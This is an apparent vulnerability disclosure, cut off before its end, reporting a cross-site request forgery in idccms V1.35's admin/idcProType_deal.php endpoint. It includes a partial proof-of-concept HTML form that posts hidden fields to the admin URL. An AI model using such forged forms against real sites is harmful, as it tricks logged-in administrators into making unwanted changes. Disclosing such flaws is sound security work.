...
idccms V1.35 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/idcProType_deal.php?mudi=rev&nohrefStr=close
...
<html>
  ...
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:80/admin/idcProType_deal.php?mudi=rev&nohrefStr=close" method="POST">
      <input type="hidden" name="dataID" value="77" />
			...
			<input type="hidden" name="theme" value="cs123" />
